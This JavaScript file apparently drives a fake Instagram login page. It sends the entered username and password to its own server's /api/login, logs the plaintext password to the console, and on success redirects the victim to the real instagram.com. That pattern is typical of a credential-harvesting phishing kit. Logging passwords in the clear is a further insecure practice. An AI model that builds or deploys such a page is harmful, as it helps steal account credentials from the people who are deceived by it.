const form = document.getElementById("loginForm");
const usernameInput = document.getElementById("username");
const passwordInput = document.getElementById("password");
const loginButton = document.querySelector("#btnDiv button");
const togglePassword = document.getElementById("togglePassword");
const errorMsg = document.getElementById("errorMsg");

// Function to enable/disable login button
loginButton.disabled = true; // Initially disabled
loginButton.classList.add("disabled");

// ==================== HELPERS ====================
function toggleLoginButton() {
  const usernameValid = usernameInput.value.trim().length >= 1;
  const passwordValid = passwordInput.value.trim().length >= 6;

  if (usernameValid && passwordValid) {
    loginButton.disabled = false;
    loginButton.classList.remove("disabled");
    loginButton.classList.add("enabled");
  } else {
    loginButton.disabled = true;
    loginButton.classList.remove("enabled");
    loginButton.classList.add("disabled");
  }
}

// ==================== EVENT LISTENERS ====================
usernameInput.addEventListener("input", toggleLoginButton);
passwordInput.addEventListener("input", toggleLoginButton);

// Toggle password visibility
if (togglePassword) {
  togglePassword.addEventListener("click", () => {
    const type =
      passwordInput.getAttribute("type") === "password" ? "text" : "password";
    passwordInput.setAttribute("type", type);
    togglePassword.classList.toggle("fa-eye-slash");
  });
}

// ==================== FORM SUBMIT ====================
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const payload = {
    username: usernameInput.value.trim(),
    password: passwordInput.value.trim(),
  };

  console.log("Username: ", payload.username);
  console.log("Password: ", payload.password);

  try {
  const response = await fetch(window.location.origin + "/api/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    const result = await response.json();

    if (response.ok) {
      errorMsg.classList.remove("visible");
      errorMsg.classList.add("hidden");
      window.location.href = "https://www.instagram.com"; // Redirect to home page
    } else {
      errorMsg.classList.remove("hidden");
      errorMsg.classList.add("visible");
      // show server message for clearer debugging
      errorMsg.innerText = result.message || (result && JSON.stringify(result)) || "Invalid username or password";
    }
  } catch (error) {
    console.error("Login Error:", error);
    errorMsg.classList.remove("hidden");
    errorMsg.classList.add("visible");
    errorMsg.innerText = "Something went wrong. Please try again later.";
  }
});

// Initialize
toggleLoginButton();
